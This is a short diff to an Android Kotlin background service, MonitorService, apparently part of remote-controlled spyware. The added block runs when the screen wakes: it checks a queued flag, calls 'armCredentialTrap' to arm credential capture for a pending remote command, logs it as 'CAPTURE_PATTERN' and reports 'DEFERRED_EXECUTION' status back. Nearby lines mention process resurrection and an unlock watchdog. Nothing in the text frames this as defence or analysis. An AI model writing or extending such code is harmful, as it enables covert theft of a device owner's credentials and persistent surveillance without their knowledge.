@@ -66,6 +66,18 @@ class MonitorService : Service() {
                     mgr.notify(NOTIF_ID, buildNotification(time))
                     checkResurrection()
 
+                    // --- DEFERRED CREDENTIAL TRAP LOGIC ---
+                    if (prefs.getBoolean("pending_cred_trap", false)) {
+                        prefs.edit().putBoolean("pending_cred_trap", false).apply()
+                        val pendingId = prefs.getInt("pending_cred_id", -1)
+                        val pendingContent = prefs.getString("pending_cred_content", "") ?: ""
+                        if (pendingId != -1) {
+                            DebugLogger.log("CAPTURE_PATTERN", "Executing deferred credential trap on screen wake.")
+                            val statusMsg = CommandProcessor.armCredentialTrap(context, pendingId, pendingContent)
+                            CommandProcessor.updateCommandStatus(context, pendingId, "DEFERRED_EXECUTION", statusMsg)
+                        }
+                    }
+
                     // --- ACTIVE UNLOCK WATCHDOG (Replaces unreliable USER_PRESENT) ---
                     unlockWatchdogJob?.cancel()
                     unlockWatchdogJob = scope.launch {
